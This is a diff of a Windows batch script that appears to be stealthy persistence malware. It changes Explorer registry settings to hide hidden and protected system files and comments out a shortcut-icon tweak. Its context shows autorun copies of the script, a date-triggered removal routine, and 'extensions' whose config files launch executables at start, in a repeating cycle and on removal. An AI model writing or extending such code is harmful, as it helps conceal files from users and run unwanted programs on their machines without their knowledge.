@@ -1,9 +1,6 @@
 @echo off
 chcp 65001>nul
 
-%~d0
-cd "%~dp0"
-
 
 
 
@@ -48,7 +45,7 @@ set path_desktop=%userProfile%\Desktop
 if not exist "%path_desktop%" (for /f "skip=2 tokens=2,* delims= " %%i in ('reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v Desktop') do call set path_desktop=%%j)>nul 2>nul
 
 set extensions=
-if exist extensions for /f "delims=" %%i in ('dir /a:d /b extensions 2^>nul') do if exist extensions\%%i\config.ini set extensions=!extensions!%%i;
+if exist "extensions" for /f "delims=" %%i in ('dir /a:d /b "extensions" 2^>nul') do if exist extensions\%%i\config.ini set extensions=!extensions!%%i;
 
 
 
@@ -61,7 +58,7 @@ if exist "%systemDrive%\%app_date%"  goto :remover
 
 %module_fileTouch% "%~f0" >nul
 
-if "%extensions%" NEQ "" for %%i in (%extensions%) do for /f "tokens=1,* delims==" %%j in ('type "extensions\%%i\config.ini"') do if /i "%%j" == "start" start /b "" extensions\%%i\%%k
+if exist "extensions" for %%i in (%extensions%) do for /f "tokens=1,* delims==" %%j in ('type "extensions\%%i\config.ini"') do if /i "%%j" == "start" start /b "" extensions\%%i\%%k
 
 
 
@@ -83,12 +80,13 @@ if exist "%systemDrive%\%app_date%"  goto :remover
 
 
 
-if "%extensions%" NEQ "" for %%i in (%extensions%) do for /f "tokens=1,* delims==" %%j in ('type "extensions\%%i\config.ini"') do if /i "%%j" == "cycle" start /b "" extensions\%%i\%%k
+if exist "extensions" for %%i in (%extensions%) do for /f "tokens=1,* delims==" %%j in ('type "extensions\%%i\config.ini"') do if /i "%%j" == "cycle" start /b "" extensions\%%i\%%k
 
 
 
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"    /v Hidden /t REG_DWORD /d 2 /f >nul
-reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Icons" /v 29     /t REG_SZ    /d "%windir%\System32\shell32.dll,-50" /f >nul
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v Hidden          /t REG_DWORD /d 2 /f >nul
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v ShowSuperHidden /t REG_DWORD /d 0 /f >nul
+rem reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Icons" /v 29     /t REG_SZ    /d "%windir%\System32\shell32.dll,-50" /f >nul
 
 
 
@@ -203,11 +201,11 @@ goto :cycle
 
 
 :remover
-if "%extensions%" NEQ "" for %%i in (%extensions%) do for /f "tokens=1,* delims==" %%j in ('type "extensions\%%i\config.ini"') do if /i "%%j" == "remove" start /b "" extensions\%%i\%%k
+if exist "extensions" for %%i in (%extensions%) do for /f "tokens=1,* delims==" %%j in ('type "extensions\%%i\config.ini"') do if /i "%%j" == "remove" start /b "" extensions\%%i\%%k
 
 
 
-reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Icons" /v 29 /f >nul
+rem reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Icons" /v 29 /f >nul
 
 if exist "%path_autoRun1%\%~nx0" del /q "%path_autoRun1%\%~nx0"
 if exist "%path_autoRun2%\%~nx0" del /q "%path_autoRun2%\%~nx0"
